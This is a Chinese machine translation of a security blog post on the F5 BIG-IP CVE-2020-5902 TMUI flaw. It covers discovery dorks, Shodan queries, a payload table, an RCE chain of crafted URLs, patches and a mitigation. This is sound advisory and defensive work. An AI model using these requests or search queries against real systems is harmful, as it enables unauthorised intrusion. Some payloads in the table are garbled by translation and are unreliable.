<html>
<head>
<title>How to attack F5 BIG-IP using CVE-2020-5902 (TMUI RCE) | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>如何使用Pentest-Tools.com CVE-2020-5902(TMUI RCE)攻击F5 BIG-IP</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/big-ip-tmui-rce#2022-07-07T10:29:14.000Z">https://pentest-tools.com/blog/big-ip-tmui-rce#2022-07-07T10:29:14.000Z</a></blockquote><div><div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>让我们解决一个不仅在BIG-IP防火墙中，而且在社交媒体上爆发的漏洞！</p><p>当影响安全产品的重大问题出现时，它会立即成为头条新闻，这种矛盾的情况不容忽视。</p><p>在这种情况下，名声排在第二位。重要的是使用BIG-IP防火墙的组织努力修补和修复漏洞。网络犯罪分子总是以令人难以置信的速度移动，他们已经在利用这一点——特别是因为这样做出奇地容易。</p><p>请继续阅读，了解识别和修复此漏洞的实用步骤。让我们开始行动吧！</p><h2 id="1-vulnerability-overview"><strong> 1。漏洞概述</strong></h2><p>该问题出现在多个BIG-IP产品的流量管理用户界面(TMUI)功能中。TMUI基本上是一个配置实用程序，允许经过身份验证的用户管理他们的产品并调整其设置。</p><p>但是研究人员发现了一种绕过身份验证的方法，并通过URL 中的<strong>单行有效载荷访问这些实用程序模块，允许攻击者在未经身份验证的情况下查看、删除、上传和执行未经授权的文件，这可能导致远程代码执行和整个设备受损。</strong></p><p>该漏洞立即获得了10/10的CVSS分数，并被标记为<a target="_blank" rel="external nofollow noopener noreferrer" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902"> CVE-2020-5902 </a>。</p><h3 id="what-is-big-ip"><strong>什么是BIG-IP？</strong></h3><p>BIG-IP是一种多用途应用，可提供各种以应用为中心的服务，如流量管理、负载平衡、web应用防火墙等。许多公司都在使用它，包括许多跨行业的财富500强企业。</p><p>有了这样一个高严重性的漏洞，你可以打赌攻击者的反应就像闻到水中血腥味的鲨鱼。</p><h2 id="2-affected-versions"><strong> 2。受影响的版本</strong></h2><p>该问题存在于以下BIG-IP产品中:LTM、AAM、AFM、Analytics、APM、ASM、DNS、FPS、GTM、链路控制器、PEM。</p><p>您可以在这些BIG-IP产品版本中找到<a target="_blank" rel="external nofollow noopener noreferrer" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902"> CVE-2020-5902 </a>:</p><ul><li><p>15.0.0通过15.1.0.3</p></li><li><p>14.1.0通过14.1.2.5</p></li><li><p>13.1.0通过13.1.3.3</p></li><li><p>12.1.0通过12.1.5.1</p></li><li><p>通过11.6.5.1</p></li></ul><p>知道在Linux和Windows上运行的应用程序都容易受到攻击也很重要。</p><h2 id="3-find-big-ip-deployments-using-google-dorks-and-shodan"><strong> 3。使用Google Dorks和Shodan </strong>查找BIG-IP部署</h2><p>您可以使用这些谷歌呆子搜索潜在易受攻击的BIG-IP部署:</p><p>inurl:"/my.policy "大ip</p><p>Inurl:my.logout.php3？</p><p>inurl:/tmui/login.jsp/</p><p><img src="../Images/37ffad0ad59a73b11b8da91a63097564.png" alt="discover-BIG-IP-deployments-using-Google-Dorks" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvYmlnLWlwLXRtdWktcmNlL2Rpc2NvdmVyLWJpZy1pcC1kZXBsb3ltZW50cy11c2luZy1nb29nbGUtZG9ya3MtMS5wbmc=?s=7928b5855b0a9cea9c00f79ff01f5af8"/></p><p>或者这个对<a target="_blank" rel="external nofollow noopener noreferrer" href="http://shodan.io/">庄丹</a>的查询:</p><p>http . title:" BIG-IP®-Redirect "<br/><img src="../Images/d24571187b9d23eddd7d7a02290e7d92.png" alt="discover BIG-IP deployments using Shodan" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvYmlnLWlwLXRtdWktcmNlL2Rpc2NvdmVyLWJpZy1pcC1kZXBsb3ltZW50cy11c2luZy1zaG9kYW4ucG5n?s=b7e13f027105bec06adaaabae9983429"/>(shod an搜索查询返回了超过8471个可能有漏洞的BIG-IP实例。)</p><h2 id="4-impact"><strong> 4。影响</strong></h2><p>许多人错误地认为该漏洞只影响BIG-IP应用，但情况更糟，因为它对该产品背后的所有系统都有重大影响，导致<strong>整个基础设施受损</strong>。</p><h3 id="check-if-a-system-is-vulnerable"><strong>检查系统是否易受攻击</strong></h3><p>如果您想快速行动，检查您的系统是否因该漏洞而暴露，<strong>我们刚刚发布了一款专用扫描器</strong>:BIG-IP漏洞扫描器<a target="_blank" rel="noopener noreferrer" href="https://pentest-tools.com/network-vulnerability-scanning/network-security-scanner-online-openvas"><strong>(CVE-2020-5902)</strong></a>。</p><p>您可以用最少的设置<strong>快速扫描您的基础架构，节省数小时的手动工作。此外，你可以争取时间打补丁，并确保你是安全的机会主义网络攻击。</strong></p><h3 id="root-cause"><strong>根本原因</strong></h3><p>从根本上说，<a target="_blank" rel="external nofollow noopener noreferrer" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902"> CVE-2020-5902 </a>是一个路径遍历问题，使得攻击者能够访问TMUI功能内的实用程序模块。</p><p>情况和2019年12月<a target="_blank" rel="external nofollow noopener noreferrer" href="https://nvd.nist.gov/vuln/detail/CVE-2019-19781"> CVE-2019-19781 </a>公开披露的情况很像。在Citrix ADC和Gateway中发现的遍历漏洞也有可能导致远程代码执行。</p><p><strong>漏洞利用概述</strong></p><p>如果对这个漏洞的利用是复杂和模糊的，这个漏洞永远不会成为太多的头条新闻。它如此简单的事实使得它广受欢迎并被大量滥用——主要是被脚本小子滥用。</p><p>您自己也可以利用此漏洞，只需按照下面的语法创建一个请求负载即可:</p><p><strong>协议</strong> :// <strong>主机</strong> / <strong> UNAUTH_PAGE </strong>..；<strong>TMUI _模块</strong></p><p>其中:</p><ul><li><p>协议:http/https</p></li><li><p>主机:目标IP地址或主机名</p></li><li><p>un auth _ PAGE:TMUI应用程序中的页面，您在该页面上获得了未经身份验证的访问权限(例如:/tmui/login.jsp/)</p></li><li><p>TMUI模块:模块的完整路径，通过它你可以执行特定的操作(更多信息请参考下表)</p></li></ul><p>像往常一样，我们喜欢让你的工作更容易，所以这里有一个表格，上面有<strong> TMUI模块</strong>以及如何利用它们的说明。</p><div class="flex flex-col"><div class="-mx-4 -my-2 overflow-x-auto sm:-mx-6"><div class="inline-block min-w-full py-2 align-middle sm:px-6"><div class="border border-gray-200 bg-white overflow-hidden shadow sm:rounded-lg"><table class="min-w-full divide-y divide-gray-200"><thead><tr><td colspan="1" rowspan="1"><strong>模块</strong></td><td colspan="1" rowspan="1"><strong>剥削</strong></td><td colspan="1" rowspan="1"><strong>有效载荷示例</strong></td></tr></thead><tr><td colspan="1" rowspan="1">目录列表</td><td colspan="1" rowspan="1">列出通过<em>目录路径</em> URL参数指定的文件夹中的文件</td><td colspan="1" rowspan="1">https://HOST/tmui/login.jsp/..；/tmui/local lb/workspace/directory list。JSP？directoryPath=/tmp/</td></tr><tr><td colspan="1" rowspan="1">文件读取</td><td colspan="1" rowspan="1">读取通过<em>文件名</em> URL参数指定的文件内容</td><td colspan="1" rowspan="1">https://HOST/tmui/login.jsp/..；/tmui/local lb/workspace/fileread . JSP？文件名=/etc/passwd</td></tr><tr><td colspan="1" rowspan="1">文件保存</td><td colspan="1" rowspan="1">使用POST方法上传通过<em>文件名</em> URL参数指定的文件和通过<em>内容</em> URL参数指定的文件内容。</td><td colspan="1" rowspan="1">https://HOST/tmui/login.jsp/..；/tmui/local lb/workspace/file save . JSP？文件名=/tmp/测试&amp;内容=测试</td></tr><tr><td colspan="1" rowspan="1">tmshCmd</td><td colspan="1" rowspan="1">通过<em>命令</em> URL参数执行预定义的(基于他们的文档)系统命令</td><td colspan="1" rowspan="1">https://HOST/tmui/login.jsp/..；/tmui/local lb/workspace/tmshcmd . JSP？命令=列表+验证+用户</td></tr></table></div></div></div></div><h2 id="5-achieve-rce-and-take-home-a-firewall"><strong> 5。实现RCE并带回家一个防火墙</strong></h2><p>通过链接<em> fileSave </em>和<em> tmshCmd </em>实用模块，可以在BIG-IP TMUI上实现远程代码执行。</p><p>首先，您需要<strong>发送这个有效负载</strong>，以便能够执行bash命令:</p><div class="content-highlight"><pre class="code-block"><code>https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash (GET method)</code></pre></div><p>接下来，您必须上传一个包含您想要在系统上执行的命令的文件:</p><div class="content-highlight"><pre class="code-block"><code>https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/rce&amp;content=whoami (POST method) - Here we uploaded the /tmp/rce file containing the whoami command.</code></pre></div><p>最后，您必须<strong>列出文件</strong>，您将看到所执行命令的输出反映在文件内容中:</p><div class="content-highlight"><pre class="code-block"><code>https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/rce

(GET method)</code></pre></div><p/>

                

                
              
                
                  <div x-data="{ showVideo: false }" x-on:close.window.stop="showVideo = false" class="not-prose group relative flex items-center justify-center overflow-hidden rounded-xl">
  
  <p aria-hidden="true" class="pointer-events-none absolute inset-0 rounded-xl bg-gray-800 opacity-40"/>
  <p aria-hidden="true" class="absolute h-28 w-28 overflow-hidden rounded-full bg-white bg-opacity-5 shadow-lg ring-1 ring-white ring-opacity-20 transition duration-300 supports-backdrop-filter:backdrop-blur-sm group-hover:scale-110 group-hover:bg-opacity-10 group-hover:ring-opacity-30 sm:h-32 sm:w-32 lg:h-36 lg:w-36"/>
  <button type="button" aria-haspopup="true" x-bind:aria-expanded="showVideo ? showVideo : undefined" class="group absolute inset-0 flex w-full items-center justify-center rounded-3xl focus:outline-none" x-on:click="showVideo = true">
    <span class="sr-only">Play video</span>
    <svg class="h-24 w-24 rounded-full ring-offset-4 ring-offset-transparent transition-[box-shadow,transform] duration-300 group-hover:scale-105 group-focus:ring-4 group-focus:ring-white group-focus:ring-opacity-30 sm:h-28 sm:w-28 lg:h-32 lg:w-32" aria-hidden="true" viewbox="0 0 24 24" fill="none">
      <path class="text-white transition-[text-opacity] duration-300" fill="currentColor" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
      <path class="text-secondary-accent-500" fill="currentColor" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"/>
    </svg>
  </button>

  
  

  <template x-if="showVideo">
    
















<template x-teleport="body">
  <div x-data="modal" class="fixed inset-0 z-120 overflow-hidden overflow-y-auto" x-on:keydown.escape.window.prevent.stop="close" x-on:close.window="close" x-show="open">
    <div class="flex h-full justify-center items-center px-4 pt-4 pb-16 sm:p-0">
      <p x-show="open" x-transition.opacity="" aria-hidden="true" class="fixed inset-0 bg-gray-500/75 transition-opacity" x-on:click.stop="close"/>

      
      

      <div x-show="open" x-transition:enter="duration-300 ease-out" x-transition:enter-start="translate-y-4 opacity-0 sm:translate-y-0 sm:scale-95" x-transition:enter-end="translate-y-0 opacity-100 sm:scale-100" x-transition:leave="duration-200 ease-in" x-transition:leave-start="translate-y-0 opacity-100 sm:scale-100" x-transition:leave-end="translate-y-4 opacity-0 sm:translate-y-0 sm:scale-95" role="dialog" aria-modal="true" aria-labelledby="modal-headline" class="transform transition-[opacity,transform] sm:my-8 h-auto sm:w-auto" x-trap.noscroll.inert="open" x-on:transitionend.self.debounce="$focus.first()">
        <div class="relative sm:w-screen sm:max-w-xl lg:max-w-3xl xl:max-w-5xl">
        <h2 id="modal-title" class="sr-only">如何使用Pentest-Tools.com CVE 2020-5902攻击F5 Big-IP并获取TMUI RCE概念验证指南</h2>
        
        <p class="aspect-video overflow-hidden rounded-lg">                    </p>
      </div>
      </div>
    </div>
  </div>
</template>


  


  </template>
</div>



                

                
              
                
                  <p/><h3 id="where-you-can-find-a-working-poc"><strong>在哪里可以找到一个有效的概念验证</strong></h3><p><em>哪里<strong>找不到</strong>你找一个？</em></p><p>到目前为止，在GitHub上快速搜索至少返回了435个结果！</p><p><img src="../Images/527011f531d0bf3b281c730901a75faf.png" alt="CVE-2020-5902 exploit poc-github" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvYmlnLWlwLXRtdWktcmNlL2N2ZS0yMDIwLTU5MDItZXhwbG9pdC1wb2MtZ2l0aHViLnBuZw==?s=8cad63e47228036048a6bed768f1a8c2"/></p><p>(GitHub搜索CVE-2020-5902漏洞)</p><p><strong>还发布了一个Metasploit模块:</strong></p><p><img src="../Images/a2f38f7f7e41376f40fb35939310388f.png" alt="metaspoit module f5 big ip tmui" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvYmlnLWlwLXRtdWktcmNlL21ldGFzcG9pdC1tb2R1bGUtZjUtYmlnLWlwLXRtdWkucG5n?s=f82b59ef8a46d2a852c292afe6a219c1"/> (CVE-2020-5902 Metasploit模块)</p><h2 id="6-how-to-fix-cve-2020-5902"><strong> 6。如何修复CVE-2020-5902 </strong></h2><p>最佳解决方案是<strong>立即</strong>将您的BIG-IP设备更新到这些版本或最新版本:</p><ul><li><p>15.1.0.4+(针对15.x分支)</p></li><li><p>14.1.2.6+(针对14.x分支)/li &gt;</p></li><li><p>13.1.3.4+(针对13.x分支)</p></li><li><p>12.1.5.2+(针对12.x分支)</p></li><li><p>11.6.5.2+(针对11.x分支)</p></li></ul><p>此外，如果无法升级，您可以<strong>应用低于</strong>的缓解措施，这不会影响您的基础设施或应用程序性能。</p><p>通过TSMH shell，发出此<strong>命令</strong><em>edit/sys httpd all-properties，</em>并在<em> include 'none' </em>行中插入以下<strong>有效负载</strong>:</p><p><em>包含'</em></p><p><em> &lt;位置匹配”。\.\.；."&gt; </em></p><p><em>重定向404 / </em></p><p><em>&lt;/位置匹配&gt;【T19】</em></p><p><em> ' </em>之后，使用此命令保存配置:<em>保存/系统配置</em></p><p>上述变通办法阻止使用<em>的请求..；</em>待执行。</p><p>另一个最佳实践是<strong>在防火墙级别拒绝所有对TMUI配置实用程序</strong>的外部访问。</p><p>如果你觉得这个指南有帮助，请在下面的评论中告诉我们，或者与正在处理这个问题的同事或同行分享。你可能会让他们的一天变得更容易忍受！</p>

                

                
              
            
          </div>
        </div>    
</body>
</html>